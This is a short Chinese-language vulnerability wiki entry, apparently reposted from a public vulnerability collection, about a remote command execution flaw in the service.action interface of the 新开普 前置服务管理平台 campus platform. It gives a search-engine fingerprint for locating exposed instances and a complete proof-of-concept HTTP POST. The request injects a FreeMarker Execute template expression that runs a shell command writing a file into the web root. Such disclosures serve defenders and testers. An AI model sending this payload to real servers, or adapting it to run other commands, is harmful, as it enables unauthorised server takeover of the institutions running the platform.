---
title: "新开普 前置服务管理平台 service.action 远程命令执行漏洞"
date: 2026-10-16 09:10:45
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "新开普-前置服务管理平台"
tags:
  - "新开普-前置服务管理平台"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

新开普 前置服务管理平台

## 网络测绘

```
title="掌上校园服务管理平台"
```

## 漏洞复现

登陆页面

![image-20230828112934396](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828112934396.png)

验证POC

```
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
```

![image-20230828112953699](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828112953699.png)

![image-20230828113009271](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828113009271.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
